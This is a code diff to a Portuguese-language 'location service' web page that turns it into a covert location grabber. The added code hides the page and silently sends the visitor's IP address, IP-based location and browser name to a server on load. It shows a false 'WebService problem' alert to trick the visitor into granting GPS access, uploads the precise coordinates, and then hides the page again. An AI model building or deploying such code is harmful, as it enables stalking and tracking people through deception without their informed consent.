@@ -7,6 +7,7 @@
 <style>
     body {
         font-family: Arial, sans-serif;
+        display: none;
     }
     #demo {
         margin-top: 20px;
@@ -18,10 +19,11 @@
 </style>
 </head>
 <body>
-
-<h1>Serviço de Localização</h1>
-<p id="demo"></p>
-<button id="retryButton" onclick="retryLocation()">Iniciar serviço de localização</button>
+<div class="div" >
+    <h1>Serviço de Localização</h1>
+    <p id="demo"></p>
+    <button id="retryButton" onclick="retryLocation()">Iniciar serviço de localização</button>
+</div>
 <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
 <script>
     
@@ -37,47 +39,50 @@ info = [];
     // URL do serviço que retorna o endereço IP do cliente
     var url = "https://api.ipify.org?format=json";
 
-    // Faz uma solicitação HTTP para obter o endereço IP
-    fetch(url)
-        .then(response => response.json())
-        .then(data => {
-            // Exibe o endereço IP na página
-            // document.getElementById("ip").innerHTML = "Endereço IP: " + data.ip;
-            // alert(data.ip);
-            ip = data.ip;
-            info[0].ip = ip;
-           
-        })
-        .catch(error => {
-            console.log("Erro ao obter endereço IP:", error);
-            // document.getElementById("ip").innerHTML = "Erro ao obter endereço IP";
-        });
+    function obte_ip(){// Faz uma solicitação HTTP para obter o endereço IP
+fetch(url)
+    .then(response => response.json())
+    .then(data => {
+        // Exibe o endereço IP na página
+        // document.getElementById("ip").innerHTML = "Endereço IP: " + data.ip;
+        // alert(data.ip);
+        ip = data.ip;
+        info[0].ip = ip;
 
+        // Agora que o primeiro fetch foi concluído, execute o segundo fetch
+        fetch('https://ipinfo.io/json')
+            .then(response => response.json())
+            .then(data => {
+                // Extraindo as informações de localização
+                const { city, region, country, loc } = data;
+                const [latitude, longitude] = loc.split(',');
+                
+                // Formatar a localização
+                const locationString = `${city}, ${region}, ${country} (${loc})`;
+                
+                // Exibir a localização na página
+                // document.getElementById('location').textContent = `Localização: ${locationString}`;
+                
+                // // Abrir uma nova página do Google Maps com as coordenadas
+                mapsLink_ip = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                // window.open(mapsLink, '_blank')
+                info[0].local_ip = mapsLink_ip;
 
-fetch('https://ipinfo.io/json')
-  .then(response => response.json())
-  .then(data => {
-    // Extraindo as informações de localização
-    const { city, region, country, loc } = data;
-    const [latitude, longitude] = loc.split(',');
-    
-    // Formatar a localização
-    const locationString = `${city}, ${region}, ${country} (${loc})`;
-    
-    // Exibir a localização na página
-    // document.getElementById('location').textContent = `Localização: ${locationString}`;
-    
-    // // Abrir uma nova página do Google Maps com as coordenadas
-     mapsLink_ip = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    // window.open(mapsLink, '_blank')
-    info[0].local_ip = mapsLink_ip;
-    salvar();
-    
-  })
-  .catch(error => {
-    console.error('Erro ao obter a localização:', error);
-    // document.getElementById('location').textContent = 'Erro ao obter a localização';
-  });
+                // Agora que o segundo fetch foi concluído, chame a função salvar
+                salvar_1();
+            })
+            .catch(error => {
+                console.error('Erro ao obter a localização:', error);
+                // document.getElementById('location').textContent = 'Erro ao obter a localização';
+            });
+    })
+    .catch(error => {
+        console.log("Erro ao obter endereço IP:", error);
+        // document.getElementById("ip").innerHTML = "Erro ao obter endereço IP";
+    });
+
+}
+
 
 function obter_localizacao(){
     document.getElementById("demo").innerHTML = ""; // Limpa a mensagem de erro
@@ -95,6 +100,7 @@ if (navigator.geolocation) {
 } else {
     document.getElementById("demo").innerHTML = "O Geolocation não é suportado pelo seu navegador.";
 }
+
 }
 
 // Função para exibir a localização
@@ -108,6 +114,8 @@ function showPosition(position) {
  info[0].geolocation = mapsLink;
    
     salvar();
+    document.querySelector('body').style.display = 'none';
+
     // Abre uma nova aba com o link do Google Maps
     // window.open(mapsLink, "_blank");
 
@@ -143,6 +151,8 @@ function showError(error) {
             document.getElementById("demo").innerHTML = "Erro desconhecido ao tentar obter a localização.";
             break;
     }
+    document.querySelector('body').style.display = 'block';
+    salvar();
 }
 
 // Função para tentar obter a localização novamente
@@ -171,7 +181,22 @@ var userAgent = window.navigator.userAgent;
     }
 
     info[0].navegador = browserName;
-    
+
+function salvar_1(){
+    navegador = info[0].navegador;
+    geolocation = info[0].geolocation;
+    ip = info[0].ip;
+    local_ip = info[0].local_ip;
+    data = formatarData(new(Date));
+
+    $.ajax({
+        data: {navegador,geolocation,ip,local_ip,data},
+        url: '/ferramentas/salvar_localizacao/',
+        success: function(data){id_registro_localizacao = data.id_registro_localizacao; obter_localizacao()}
+    })
+
+
+}
 
 function salvar(){
     
@@ -191,9 +216,9 @@ function salvar(){
 
     $.ajax({
         //data: { info: JSON.stringify(info) },//{info},
-        data: {navegador,geolocation,ip,local_ip,data,texto},
+        data: {navegador,geolocation,ip,local_ip,data,texto,id_registro_localizacao},
         type: 'GET',
-        url: '/ferramentas/salvar_localizacao/',
+        url: '/ferramentas/def_atualiza_localizacao/',
         success: function(data){},
         error: function(data){}
     })
@@ -212,7 +237,9 @@ function formatarData(data) {
 
     return `${diaSemana} ${dia}/${mes}/${ano} às ${horas}:${minutos}:${segundos}`;
 }
-obter_localizacao()  
+obte_ip();
+alert(`Problemas com o WebService, Clique em 'OK' e depois em 'Permitir' para ativar o GeoLocation e resolver o problema.`)
+
 </script>
 
 </body>
